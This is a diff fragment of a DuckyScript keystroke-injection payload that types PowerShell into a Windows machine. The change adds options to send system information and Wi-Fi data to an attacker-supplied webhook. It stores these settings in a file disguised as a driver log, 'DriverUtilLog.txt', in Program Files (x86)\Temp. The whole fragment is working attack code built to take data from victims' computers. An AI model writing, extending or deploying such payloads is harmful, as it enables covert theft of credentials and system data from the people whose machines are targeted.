@@ -13,10 +13,17 @@ LEFTARROW
 DELAY 300
 ENTER
 DELAY 700
-STRING $webhook = "PUT WEBHOOK HERE"
+REM **CUSTOMIZATION** Use these variables to pick what the program does
+STRING $webhook = "PUT WEBHOOK HERE"; $useSpoilers = "true"; $sendSysInfo = "true"; $sendWifiData = "true"
 DELAY 50
 ENTER
-STRING New-Item "C:\Program Files (x86)\Temp\DriverUtilLog.txt" -ItemType File -Value $webhook
+DELAY 50
+REM **DO NOT CHANGE THIS ONE OR THE PROGRAM WILL NOT WORK**
+STRING $seperate = ","
+DELAY 50
+ENTER
+DELAY 50
+STRING New-Item "C:\Program Files (x86)\Temp\DriverUtilLog.txt" -ItemType File -Value $webhook$seperate$sendSysInfo$seperate$sendWifiData$seperate$useSpoilers
 DELAY 100
 ENTER
 DELAY 50
